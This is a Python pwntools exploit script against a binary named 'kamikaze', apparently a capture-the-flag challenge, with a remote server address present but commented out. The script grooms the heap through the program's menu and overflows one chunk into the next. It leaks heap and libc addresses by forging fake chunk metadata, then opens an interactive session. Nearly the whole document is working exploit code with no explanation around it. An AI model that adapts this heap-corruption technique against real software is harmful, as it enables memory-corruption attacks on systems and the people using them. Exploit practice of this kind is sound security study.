#!/usr/bin/python
from pwn import *

#p = remote("185.168.131.14",6200)
p = process("./kamikaze")
raw_input()

def menu():
	p.recvuntil(">>")

def add_s(wei,stan_s,stan,comm):
	menu()
	p.sendline("1")
	p.recvuntil("song:")
	p.sendline(str(wei))
	p.recvuntil("stanza:")
	p.sendline(str(stan_s))
	p.recvuntil("stanza:")
	p.sendline(stan)
	p.recvuntil("too:")
	p.sendline(comm)

def kamikaze(wei,seed):
	menu()
	p.sendline("3")
	p.recvuntil("weight:")
	p.sendline(str(wei))
	p.recvuntil("seed:")
	p.sendline(str(seed))

def remove(wei):
	menu()
	p.sendline("4")
	p.recvuntil("weight:")
	p.sendline(str(wei))

def play(idx):
	menu()
	p.sendline("5")
	p.recvuntil("index:")
	p.sendline(str(idx))

buf = "B"*16
add_s(20,30,"AAAA",buf)			# head.

add_s(21,30,"AAAA",buf)
remove(21)

add_s(21,80,"AAAA",buf)
add_s(22,80,"AAAA",buf)
add_s(23,30,"AAAA",buf)

# overflow from 21 into 22.
remove(22)
kamikaze(21,14)

add_s(22,80,"AAAA",buf)
#p.interactive()
remove(23)

play(3)
p.recvuntil("Weight: ")
leak = p.recvline().strip("\n")
heap = int(leak,16) - 0x1b0
log.success("Heap: " + hex(heap))

#raw_input()
#add_s(24,80,"AAAA",buf)
remove(heap+0x1b0)

remove(20)

buf1 = "A"*8
buf1 += p64(0xe1)

add_s(20,30,buf1,buf)

buf2 = p64(0x80)
buf2 += p64(heap+0x50)
buf2 += p64(heap+0x1f0)

fake = p64(0x90)
fake += p64(heap+0x50)
fake += p64(0x0)

add_s(0,80,fake,buf)
add_s(21,30,buf2,buf)

remove(0x80)

play(1)
p.recvuntil("Stanza: ")
libc = p.recv(6) + "\x00"*2
libc = u64(libc) - 0x3c4b78
log.success("Libc: " + hex(libc))

p.interactive()
